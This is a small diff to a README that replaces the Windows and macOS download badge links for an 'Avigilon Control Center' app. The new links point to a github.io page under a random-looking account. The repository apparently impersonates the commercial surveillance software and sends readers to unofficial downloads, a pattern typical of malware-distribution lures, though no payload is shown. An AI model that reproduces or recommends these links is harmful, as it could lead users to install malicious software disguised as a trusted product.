@@ -10,8 +10,8 @@
 
 <div align="center">  
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://avigilon-control-center-desktop-app.github.io/.github)  
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-silver?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/avigilon-c-c)  
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://darahglyegoweat.github.io/.github/avigilon-control-center-app)  
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-silver?style=for-the-badge&logo=apple)](https://darahglyegoweat.github.io/.github/avigilon-control-center-app)  
 
 </div>  
 
